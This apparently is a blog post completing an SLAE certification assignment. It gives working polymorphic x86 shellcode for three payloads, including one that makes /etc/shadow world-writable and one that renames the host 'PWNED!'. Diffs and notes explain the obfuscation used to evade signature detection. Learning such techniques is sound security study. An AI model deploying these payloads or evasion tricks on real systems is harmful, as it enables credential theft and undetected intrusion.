---
comments: true
date: 2014-05-12
layout: blog
title: 'SLAE Assignment 6: Polymorphic Shellcode'
summary: '6th assignment of the SLAE'
category: blog
image: /images/header_images/slaelogo.png
tags: [asm-x86,nasm,slae]
---

This is the sixth of the seven assignment necessary to accomplish the [SecurityTube Linux Assembly Expert](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html) certification. The instructions for this assignment are:

	
  1. Take up 3 shellcodes from shell-storm and create polymorphic versions of them
	
  2. The polymorphic version _**cannot**_ be larger than 150% of existing one
	
  3. Bonus point for making it shorter than original

The first shellcode that i chose to change is a chmod("/etc/shadow", 0777)  which original code can be found [here](http://shell-storm.org/shellcode/files/shellcode-590.php).

The code of the polymorphic version is shown below.

	global _start
	section .text
	_start:
		cdq
		mov al,0xe
		inc al
		push edx
		mov edx,0x655c5150
		add edx,0x12131311
		push edx
		mov edx,0x2f636873
		rol edx,16
		push edx
		mov dword [esp-4],0x74652f2f
		sub esp,4
		mov ebx,esp
		mov cx,0x1ff
		int 0x80
		inc eax
		int 0x80

The differences between the original version and the polymorphic version are:

	--- orig.asm	2014-05-12 11:21:18.092950797 +0200
	+++ poly.asm	2014-05-12 11:21:10.639951300 +0200
	@@ -1,14 +1,19 @@
	global _start
	section .text
	_start:
	-	xor eax,eax
	-	push eax
	-	mov al,0xf
	-	push 0x776f6461
	-	push 0x68732f63
	-	push 0x74652f2f
	+	cdq
	+	mov al,0xe
	+	inc al
	+	push edx
	+	mov edx,0x655c5150
	+	add edx,0x12131311
	+	push edx
	+	mov edx,0x2f636873
	+	rol edx,16
	+	push edx
	+	mov dword [esp-4],0x74652f2f
	+	sub esp,4
		mov ebx,esp
	-	xor ecx,ecx
		mov cx,0x1ff
		int 0x80
		inc eax

  * instead of using the exact syscall number i moved inside the register (syscall-1 ) and then i incremented it `(0xe+1=0xf )``

  * instead of directly pushing `/etc/shadow`  i used three different methods:

    * I moved inside edx  the value `0x655c5150` and then I added `0x12131311` to it (the result is `0x776f6461` which corresponds to _woda_)

	* I moved inside edx  the value `0x2f636873` and then i left-rotated of 16 bits this value before pushing it onto the stack (`0x2f636873` become `0x68732f63` which correspond to _hs/c_)

	* Instead of directly pushing the last value (`0x74652f2f` which correspond to _te//_) onto the stack I chose to use the mov  instruction to move the value using the esp  register. Please note that while the push instruction adjust the stack pointer automatically, if we use the mov  instruction we need to manual adjust the stack pointer using sub esp,4

* * *

The second shellcode is a `sys_sethostname("PWNED!", 6)`. The original code can be found [here](http://shell-storm.org/shellcode/files/shellcode-622.php).

The code of the polymorphic version is:
    
	global _start
	section .text
	_start:
		mov al,0x15
		add al,0x35
		mov edx,0x454e2144
		rol edx,16
		push edx
		push WORD 0x5750
		mov ebx,esp
		mov cl,6
		int 0x80
		mov al,1
		int 0x80

The differences between the original version and the polymorphic version are:

	--- orig.asm	2014-05-12 11:51:24.994828858 +0200
	+++ poly.asm	2014-05-12 11:51:10.962829805 +0200
	@@ -1,20 +1,14 @@
	global _start
	section .text
	_start:
	-	jmp    0x8048073
	-	xor    eax,eax
	-	mov    al,0x4a
	-	pop    ebx
	-	mov    cl,0x8
	-	int    0x80
	-	xor    eax,eax
	-	mov    al,0x1
	-	xor    ebx,ebx
	-	int    0x80
	-	call   0x8048062
	-	push   eax
	-	ja     0x80480c9
	-	gs
	-	inc    esp
	-	and    ecx,ah
	-	.byte 0x21
	+	mov al,0x15
	+	add al,0x35
	+	mov edx,0x454e2144
	+	rol edx,16
	+	push edx
	+	push WORD 0x5750
	+	mov ebx,esp
	+	mov cl,6
	+	int 0x80
	+	mov al,1
	+	int 0x80

* * *

The last shellcode which has been "polymorphized" is a "set /proc/sys/net/ipv4/ip_forward to 0 and exit()". The original code can be found [here](http://shell-storm.org/shellcode/files/shellcode-848.php).

This is the code of the polymorphic version:
    
	global _start
	section .text
	_start:
		xchg ebx,eax
		xor eax,ebx

		mov dword [esp-4], eax
		sub esp,4
		mov dword [esp-4],0x64726177
		mov dword [esp-8], 0x726f665f
		sub esp,8
		mov ebx,0x2f347069
		rol ebx,16
		push ebx
		mov ebx,0x6310101a
		add ebx,0x13605915
		push ebx
		push 0x74656e2f
		push 0x2f737973
		mov ebx,0x6f722f63
		rol ebx,16
		mov dword [esp-4],ebx
		sub esp,4
		push WORD 0x702f
		mov ebx,esp
		mov cl,0x1
		mov al,0x5
		int 0x80
		
		mov ebx,eax
		push 0x30
		mov ecx,esp
		mov dl,0x1
		mov al,0x4
		int 0x80
		
		mov al,0x6
		int 0x80
		
		mov al,0x1
		int 0x80

And this is the difference between the two versions:

	--- orig.asm	2014-05-12 12:03:17.691780762 +0200
	+++ poly.asm	2014-05-12 11:58:44.086799226 +0200
	@@ -1,34 +1,37 @@
	global _start
	section .text
	_start:
	-	xor eax,eax
	-	push eax
	-	push 0x64726177
	-	push 0x726f665f
	-	push 0x70692f34
	-	push 0x7670692f
	+	xchg ebx,eax
	+	xor eax,ebx
	+	mov dword [esp-4], eax
	+	sub esp,4
	+	mov dword [esp-4],0x64726177
	+	mov dword [esp-8], 0x726f665f
	+	sub esp,8
	+	mov ebx,0x2f347069
	+	rol ebx,16
	+	push ebx
	+	mov ebx,0x6310101a
	+	add ebx,0x13605915
	+	push ebx
		push 0x74656e2f
		push 0x2f737973
	-	push 0x2f636f72
	-	push word 0x702f
	+	mov ebx,0x6f722f63
	+	rol ebx,16
	+	mov dword [esp-4],ebx
	+	sub esp,4
	+	push WORD 0x702f
		mov ebx,esp
	-	xor ecx,ecx
		mov cl,0x1
		mov al,0x5
		int 0x80
		
		mov ebx,eax
	-	xor ecx,ecx
	-	push ecx
		push 0x30
		mov ecx,esp
	-	xor edx,edx
		mov dl,0x1
		mov al,0x4
		int 0x80
		
	-	xor eax,eax
	-	add al,0x6
	+	mov al,0x6
		int 0x80
	-	xor eax,eax
	-	inc eax
	-	xor ebx,ebx
	+	mov al,0x1
		int 0x80

The methods used to made the polymorphic version are the same as the first shellcode (`rol`, `add`, `mov`).

* * *

Summary:

| # | Original Length (b) | Polymorphic Length (b) | Difference (%) |
|:-:|:----------------:|:------------------:|:--------------:|
| 1 | 33 | 49  | +48.5 |
| 2 | 32 | 27  | -15.6 |
| 3 | 83 | 107 | +28.9 |

As we can see above, mine version of the second shellcode is **smaller** than the original one.


This is all for the second-last assignment of this certification, see you soon with the last (Custom Crypter) :-(

All the sources can be found in my [Github page](https://github.com/polslinux/SLAE/).


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

**Student ID: SLAE-526**
